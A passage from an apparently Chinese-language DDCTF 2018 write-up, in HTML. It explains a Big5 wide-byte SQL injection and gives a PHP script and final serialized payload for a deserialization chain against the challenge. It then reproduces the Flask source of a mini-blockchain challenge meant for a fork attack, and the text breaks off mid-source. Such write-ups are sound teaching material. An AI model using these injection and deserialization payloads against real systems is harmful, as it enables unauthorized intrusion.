class="params">(<span class="keyword">byte</span>[] b)</span></span></div><div class="line">  &#123;</div><div class="line">    StringBuilder hs = <span class="keyword">new</span> StringBuilder();</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> n = <span class="number">0</span>; (b != <span class="keyword">null</span>) &amp;&amp; (n &lt; b.length); n++)</div><div class="line">    &#123;</div><div class="line">      String stmp = Integer.toHexString(b[n] &amp; <span class="number">0xFF</span>);</div><div class="line">      <span class="keyword">if</span> (stmp.length() == <span class="number">1</span>) &#123;</div><div class="line">        hs.append(<span class="string">'0'</span>);</div><div class="line">      &#125;</div><div class="line">      hs.append(stmp);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> hs.toString().toUpperCase();</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>一开始以为是宽字节注入，试了很多方式都没试出来，突然看到了提示，如图，链接过去是一篇关于big编码说明的文件。。。</p><img src="/2018/04/19/ddctf-2018/8.png" alt="8.png" title=""><p>那思路很明确了，找一个big编码的字，第二位字节为 <code>0x5c</code> 即 <code>\</code> 转义掉gpc生成的 <code>\</code> 最后成功逃逸单引号 <code>\\&#39;</code></p><img src="/2018/04/19/ddctf-2018/9.png" alt="9.png" title=""><p>接下来就是常规注入了，注入完毕后发现，并没有flag。。。只有一个备份文件。。。算了，下载下来备份文件代码审计吧。</p><img src="/2018/04/19/ddctf-2018/10.png" alt="10.png" title=""><p>发现竟然有个<code>api</code> 接受一个字符串并反序列，直接就get到了考点，<strong>构造反序列化执行链，获取flag</strong></p><img src="/2018/04/19/ddctf-2018/11.png" alt="11.png" title=""><p>这个反序列执行链很简单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">public</span> $sql;</div><div class="line"></div><div class="line">    <span class="comment">//</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;sql=<span class="keyword">new</span> SQL();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SQL</span></span></div><div class="line">&#123;</div><div class="line">    </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">FlagGet</span><span class="params">($user)</span></span></div><div class="line">    &#123;</div><div class="line">      <span class="keyword">return</span> <span class="string">""</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> $user_uuid;</div><div class="line">    <span class="keyword">public</span> $fl;</div><div class="line"></div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">$t =  <span class="keyword">new</span> Test();</div><div class="line">$t-&gt;fl = <span class="keyword">new</span> Flag();</div><div class="line">$t-&gt;user_uuid = <span class="string">"c09764a2-8d31-4643-907a-5d663b9348dc"</span>;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> serialize($t);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>生成 <code>O:4:&quot;Test&quot;:2:{s:9:&quot;user_uuid&quot;;s:36:&quot;c09764a2-8d31-4643-907a-5d663b9348dc&quot;;s:2:&quot;fl&quot;;O:4:&quot;Flag&quot;:1:{s:3:&quot;sql&quot;;O:3:&quot;SQL&quot;:0:{}}}</code> 不过要把类名称改成<code>&quot;Index\Helper\Flag&quot;, &quot;Index\Helper\SQL&quot;,&quot;Index\Helper\Test&quot;</code>这种形式才能在远程环境执行。<br>最后的payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:17:&quot;Index\Helper\Test&quot;:2:&#123;s:9:&quot;user_uuid&quot;;s:36:&quot;c09764a2-8d31-4643-907a-5d663b9348dc&quot;;s:2:&quot;fl&quot;;O:17:&quot;Index\Helper\Flag&quot;:1:&#123;s:3:&quot;sql&quot;;O:16:&quot;Index\Helper\SQL&quot;:0:&#123;&#125;&#125;&#125;</div></pre></td></tr></table></figure><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>有关于区块链的代码审计，也是第一次接触到区块链的具体原理，分析了一天，收获蛮大的，这边其实可以利用<strong>区块链分叉攻击</strong>来实现bank未被hack掉的区块链链路（只要这个链路比被hack掉的链路长就可以了。）</p><p>mini区块链源码如下（对学习区块链还是挺有意思）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></div><div class="line"><span class="comment"># written in python 2.7</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> hashlib, json, rsa, uuid</div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, url_for, escape, request</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">app = Flask(__name__)</div><div class="line">app.secret_key = <span class="string">'*********************'</span></div><div class="line">url_prefix = <span class="string">'/b9744af30897e'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'Here is your flag: DDCTF&#123;******************&#125;'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash</span><span class="params">(x)</span>:</span></div><div class="line">    <span class="keyword">return</span> hashlib.sha256(hashlib.md5(x).digest()).hexdigest()</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_reducer</span><span class="params">(x, y)</span>:</span></div><div class="line">    <span class="keyword">return</span> hash(hash(x)+hash(y))</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">has_attrs</span><span class="params">(d, attrs)</span>:</span></div><div class="line">    <span class="keyword">if</span> type(d) != type(&#123;&#125;): <span class="keyword">raise</span> Exception(<span class="string">"Input should be a dict/JSON"</span>)</div><div class="line">    <span class="keyword">for</span> attr <span class="keyword">in</span> attrs:</div><div class="line">        <span class="keyword">if</span> attr <span class="keyword">not</span> <span class="keyword">in</span> d:</div><div class="line">            <span class="keyword">raise</span> Exception(<span class="string">"&#123;&#125; should be presented in the input"</span>.format(attr))</div><div class="line"></div><div class="line">EMPTY_HASH = <span class="string">'0'</span>*<span class="number">64</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">addr_to_pubkey</span><span class="params">(address)</span>:</span></div><div class="line">    <span class="keyword">return</span> rsa.PublicKey(int(address, <span class="number">16</span>), <span class="number">65537</span>)</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pubkey_to_address</span><span class="params">(pubkey)</span>:</span></div><div class="line">    <span class="keyword">assert</span> pubkey.e == <span class="number">65537</span></div><div class="line">    hexed = hex(pubkey.n)</div><div class="line">    <span class="keyword">if</span> hexed.endswith(<span class="string">'L'</span>): hexed = hexed[:<span class="number">-1</span>]</div><div class="line">    <span class="keyword">if</span> hexed.startswith(<span class="string">'0x'</span>): hexed = hexed[<span class="number">2</span>:]</div><div class="line">    <span class="keyword">return</span> hexed</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_addr_key_pair</span><span class="params">()</span>:</span></div><div class="line">    pubkey, privkey = rsa.newkeys(<span class="number">384</span>)</div><div class="line">    <span class="keyword">return</span> pubkey_to_address(pubkey), privkey</div><div class="line"></div><div class="line">bank_address, bank_privkey = gen_addr_key_pair()</div><div class="line">hacker_address, hacker_privkey = gen_addr_key_pair()</div><div class="line">shop_address, shop_privkey = gen_addr_key_pair()</div><div class="line">shop_wallet_address, shop_wallet_privkey = gen_addr_key_pair()</div><div class="line"></div><div class="line">my_address, my_privkey = gen_addr_key_pair()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign_input_utxo</span><span class="params">(input_utxo_id, privkey)</span>:</span></div><div class="line">    <span class="keyword">return</span> rsa.sign(input_utxo_id, privkey, <span class="string">'SHA-1'</span>).encode(<span class="string">'hex'</span>)</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_utxo</span><span class="params">(utxo)</span>:</span></div><div class="line">    <span class="keyword">return</span> reduce(hash_reducer, [utxo[<span class="string">'id'</span>], utxo[<span class="string">'addr'</span>], str(utxo[<span class="string">'amount'</span>])])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_output_utxo</span><span class="params">(addr_to, amount)</span>:</span></div><div class="line">    utxo = &#123;<span class="string">'id'</span>: str(uuid.uuid4()), <span class="string">'addr'</span>: addr_to, <span class="string">'amount'</span>: amount&#125;</div><div class="line">    utxo[<span class="string">'hash'</span>] = hash_utxo(utxo)</div><div class="line">    <span class="keyword">return</span> utxo</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_tx</span><span class="params">(tx)</span>:</span></div><div class="line">    <span class="keyword">return</span> reduce(hash_reducer, [</div><div class="line">        reduce(hash_reducer, tx[<span class="string">'input'</span>], EMPTY_HASH),</div><div class="line">        reduce(hash_reducer, [utxo[<span class="string">'hash'</span>] <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]], EMPTY_HASH)</div><div class="line">    ])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tx</span><span class="params">(input_utxo_ids, output_utxo, privkey_from=None)</span>:</span></div><div class="line">    tx = &#123;<span class="string">'input'</span>: input_utxo_ids, <span class="string">'signature'</span>: [sign_input_utxo(id, privkey_from) <span class="keyword">for</span> id <span class="keyword">in</span> input_utxo_ids], <span class="string">'output'</span>: output_utxo&#125;</div><div class="line">    tx[<span class="string">'hash'</span>] = hash_tx(tx)</div><div class="line">    <span class="keyword">return</span> tx</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_block</span><span class="params">(block)</span>:</span></div><div class="line">    <span class="keyword">return</span> reduce(hash_reducer, [block[<span class="string">'prev'</span>], block[<span class="string">'nonce'</span>], reduce(hash_reducer, [tx[<span class="string">'hash'</span>] <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]], EMPTY_HASH)])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_block</span><span class="params">(prev_block_hash, nonce_str, transactions)</span>:</span></div><div class="line">    <span class="keyword">if</span> type(prev_block_hash) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">'prev_block_hash should be hex-encoded hash value'</span>)</div><div class="line">    nonce = str(nonce_str)</div><div class="line">    <span class="keyword">if</span> len(nonce) &gt; <span class="number">128</span>: <span class="keyword">raise</span> Exception(<span class="string">'the nonce is too long'</span>)</div><div class="line">    block = &#123;<span class="string">'prev'</span>: prev_block_hash, <span class="string">'nonce'</span>: nonce, <span class="string">'transactions'</span>: transactions&#125;</div><div class="line">    block[<span class="string">'hash'</span>] = hash_block(block)</div><div class="line">    <span class="keyword">return</span> block</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_blockchain_tail</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> max(session[<span class="string">'blocks'</span>].values(), key=<span class="keyword">lambda</span> block: block[<span class="string">'height'</span>])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_utxo</span><span class="params">(blockchain_tail)</span>:</span></div><div class="line">    curr_block = blockchain_tail</div><div class="line">    blockchain = [curr_block]</div><div class="line">    <span class="keyword">while</span> curr_block[<span class="string">'hash'</span>] != session[<span class="string">'genesis_block_hash'</span>]:</div><div class="line">        curr_block = session[<span class="string">'blocks'</span>][curr_block[<span class="string">'prev'</span>]]</div><div class="line">        blockchain.append(curr_block)</div><div class="line">    blockchain = blockchain[::<span class="number">-1</span>]</div><div class="line">    utxos = &#123;&#125;</div><div class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blockchain:</div><div class="line">        <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]:</div><div class="line">            <span class="keyword">for</span> input_utxo_id <span class="keyword">in</span> tx[<span class="string">'input'</span>]:</div><div class="line">                <span class="keyword">del</span> utxos[input_utxo_id]</div><div class="line">            <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]:</div><div class="line">                utxos[utxo[<span class="string">'id'</span>]] = utxo</div><div class="line">    <span class="keyword">return</span> utxos</div><div class="line">        </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_balance</span><span class="params">(utxos)</span>:</span></div><div class="line">    balance = &#123;bank_address: <span class="number">0</span>, hacker_address: <span class="number">0</span>, shop_address: <span class="number">0</span>&#125;</div><div class="line">    <span class="keyword">for</span> utxo <span class="keyword">in</span> utxos.values():</div><div class="line">        <span class="keyword">if</span> utxo[<span class="string">'addr'</span>] <span class="keyword">not</span> <span class="keyword">in</span> balance:</div><div class="line">            balance[utxo[<span class="string">'addr'</span>]] = <span class="number">0</span></div><div class="line">        balance[utxo[<span class="string">'addr'</span>]] += utxo[<span class="string">'amount'</span>]</div><div class="line">    <span class="keyword">return</span> balance</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_utxo_signature</span><span class="params">(address, utxo_id, signature)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">return</span> rsa.verify(utxo_id, signature.decode(<span class="string">'hex'</span>), addr_to_pubkey(address))</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">append_block</span><span class="params">(block, difficulty=int<span class="params">(<span class="string">'f'</span>*<span class="number">64</span>, <span class="number">16</span>)</span>)</span>:</span></div><div class="line">    has_attrs(block, [<span class="string">'prev'</span>, <span class="string">'nonce'</span>, <span class="string">'transactions'</span>])</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> type(block[<span class="string">'prev'</span>]) == type(<span class="string">u''</span>): block[<span class="string">'prev'</span>] = str(block[<span class="string">'prev'</span>])</div><div class="line">    <span class="keyword">if</span> type(block[<span class="string">'nonce'</span>]) == type(<span class="string">u''</span>): block[<span class="string">'nonce'</span>] = str(block[<span class="string">'nonce'</span>])</div><div class="line">    <span class="comment"># print session['blocks']</span></div><div class="line">    <span class="comment"># print ['prev']</span></div><div class="line">    <span class="keyword">if</span> block[<span class="string">'prev'</span>] <span class="keyword">not</span> <span class="keyword">in</span> session[<span class="string">'blocks'</span>]: <span class="keyword">raise</span> Exception(<span class="string">"unknown parent block"</span>)</div><div class="line">    tail = session[<span class="string">'blocks'</span>][block[<span class="string">'prev'</span>]]</div><div class="line">    utxos = calculate_utxo(tail)</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> type(block[<span class="string">'transactions'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">'Please put a transaction array in the block'</span>)</div><div class="line">    new_utxo_ids = set()</div><div class="line">    <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]:</div><div class="line">        has_attrs(tx, [<span class="string">'input'</span>, <span class="string">'output'</span>, <span class="string">'signature'</span>])</div><div class="line">        </div><div class="line">        <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]:</div><div class="line">            has_attrs(utxo, [<span class="string">'amount'</span>, <span class="string">'addr'</span>, <span class="string">'id'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'id'</span>]) == type(<span class="string">u''</span>): utxo[<span class="string">'id'</span>] = str(utxo[<span class="string">'id'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'addr'</span>]) == type(<span class="string">u''</span>): utxo[<span class="string">'addr'</span>] = str(utxo[<span class="string">'addr'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'id'</span>]) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of id of output utxo"</span>)</div><div class="line">            <span class="keyword">if</span> utxo[<span class="string">'id'</span>] <span class="keyword">in</span> new_utxo_ids: <span class="keyword">raise</span> Exception(<span class="string">"output utxo of same id(&#123;&#125;) already exists."</span>.format(utxo[<span class="string">'id'</span>]))</div><div class="line">            new_utxo_ids.add(utxo[<span class="string">'id'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'amount'</span>]) != type(<span class="number">1</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of amount of output utxo"</span>)</div><div class="line">            <span class="keyword">if</span> utxo[<span class="string">'amount'</span>] &lt;= <span class="number">0</span>: <span class="keyword">raise</span> Exception(<span class="string">"invalid amount of output utxo"</span>)</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'addr'</span>]) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of address of output utxo"</span>)</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                addr_to_pubkey(utxo[<span class="string">'addr'</span>])</div><div class="line">            <span class="keyword">except</span>:</div><div class="line">                <span class="keyword">raise</span> Exception(<span class="string">"invalid type of address(&#123;&#125;)"</span>.format(utxo[<span class="string">'addr'</span>]))</div><div class="line">            utxo[<span class="string">'hash'</span>] = hash_utxo(utxo)</div><div class="line">        tot_output = sum([utxo[<span class="string">'amount'</span>] <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]])</div><div class="line">        </div><div class="line">        <span class="keyword">if</span> type(tx[<span class="string">'input'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">"type of input utxo ids in tx should be array"</span>)</div><div class="line">        <span class="keyword">if</span> type(tx[<span class="string">'signature'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">"type of input utxo signatures in tx should be array"</span>)</div><div class="line">        <span class="keyword">if</span> len(tx[<span class="string">'input'</span>]) != len(tx[<span class="string">'signature'</span>]): <span class="keyword">raise</span> Exception(<span class="string">"lengths of arrays of ids and signatures of input utxos should be the same"</span>)</div><div class="line">        tot_input = <span class="number">0</span></div><div class="line">        tx[<span class="string">'input'</span>] = [str(i) <span class="keyword">if</span> type(i) == type(<span class="string">u''</span>) <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> tx[<span class="string">'input'</span>]]</div><div class="line">        tx[<span class="string">'signature'</span>] = [str(i) <span class="keyword">if</span> type(i) == type(<span class="string">u''</span>) <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> tx[<span class="string">'signature'</span>]]</div><div class="line">        <span class="keyword">for</span> utxo_id, signature <span class="keyword">in</span> zip(tx[<span class="string">'input'</span>], tx[<span class="string">'signature'</span>]):</div><div class="line">            <span class="keyword">if</span> type(utxo_id) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of id of input utxo"</span>)</div><div class="line">            <span class="keyword">print</span> utxos</div><div class="line">            <span class="keyword">if</span> utxo_id <span class="keyword">not</span> <span class="keyword">in</span> utxos: <span class="keyword">raise</span> Exception(<span class="string">"invalid id of input utxo. Input utxo(&#123;&#125;) does not exist or it has been consumed."</span>.format(utxo_id))</div><div class="line">            utxo = utxos[utxo_id]</div><div class="line">            <span class="keyword">if</span> type(signature) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of signature of input utxo"</span>)</div><div class="line">            <span class="keyword">if</span> <span class="keyword">not</span> verify_utxo_signature(utxo[<span class="string">'addr'</span>], utxo_id, signature):</div><div class="line">                <span class="keyword">raise</span> Exception(<span class="string">"Signature of input utxo is not valid. You are not the owner of this input utxo(&#123;&#125;)!"</span>.format(utxo_id))</div><div class="line">            tot_input += utxo[<span class="string">'amount'</span>]</div><div class="line">            <span class="keyword">del</span> utxos[utxo_id]</div><div class="line">        <span class="keyword">if</span> tot_output &gt; tot_input:</div><div class="line">            <span class="keyword">raise</span> Exception(<span class="string">"You don't have enough amount of DDCoins in the input utxo! &#123;&#125;/&#123;&#125;"</span>.format(tot_input, tot_output))</div><div class="line">        tx[<span class="string">'hash'</span>] = hash_tx(tx)</div><div class="line">    </div><div class="line">    block = create_block(block[<span class="string">'prev'</span>], block[<span class="string">'nonce'</span>], block[<span class="string">'transactions'</span>])</div><div class="line">    <span class="comment"># print block['hash']</span></div><div class="line">    block_hash = int(block[<span class="string">'hash'</span>], <span class="number">16</span>)</div><div class="line">    <span class="comment"># print block_hash</span></div><div class="line">    <span class="comment"># print difficulty</span></div><div class="line">    <span class="keyword">if</span> block_hash &gt; difficulty: <span class="keyword">raise</span> Exception(<span class="string">'Please provide a valid Proof-of-Work'</span>)</div><div class="line">    block[<span class="string">'height'</span>] = tail[<span class="string">'height'</span>]+<span class="number">1</span></div><div class="line">    <span class="keyword">if</span> len(session[<span class="string">'blocks'</span>]) &gt; <span class="number">50</span>: <span class="keyword">raise</span> Exception(<span class="string">'The blockchain is too long. Use ./reset to reset the blockchain'</span>)</div><div class="line">    <span class="keyword">if</span> block[<span class="string">'hash'</span>] <span class="keyword">in</span> session[<span class="string">'blocks'</span>]: <span class="keyword">raise</span> Exception(<span class="string">'A same block is already in the blockchain'</span>)</div><div class="line">    session[<span class="string">'blocks'</span>][block[<span class="string">'hash'</span>]] = block</div><div class="line">    session.modified = <span class="keyword">True</span></div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'blocks'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</div><div class="line">        session[<span class="string">'blocks'</span>] = &#123;&#125;</div><div class="line">        session[<span class="string">'your_diamonds'</span>] = <span class="number">0</span></div><div class="line">    </div><div class="line">        <span class="comment"># First, the bank issued some DDCoins ...</span></div><div class="line">        total_currency_issued = create_output_utxo(bank_address, <span class="number">1000000</span>)</div><div class="line">        <span class="comment"># print "lalala:"+str(total_currency_issued)</span></div><div class="line">        genesis_transaction = create_tx([], [total_currency_issued]) <span class="comment"># create DDCoins from nothing</span></div><div class="line">        <span class="comment"># print genesis_transaction</span></div><div class="line">        genesis_block = create_block(EMPTY_HASH, <span class="string">'The Times 03/Jan/2009 Chancellor on brink of second bailout for bank'</span>, [genesis_transaction])</div><div class="line">        session[<span class="string">'genesis_block_hash'</span>] = genesis_block[<span class="string">'hash'</span>]</div><div class="line">        genesis_block[<span class="string">'height'</span>] = <span class="number">0</span></div><div class="line">        session[<span class="string">'blocks'</span>][genesis_block[<span 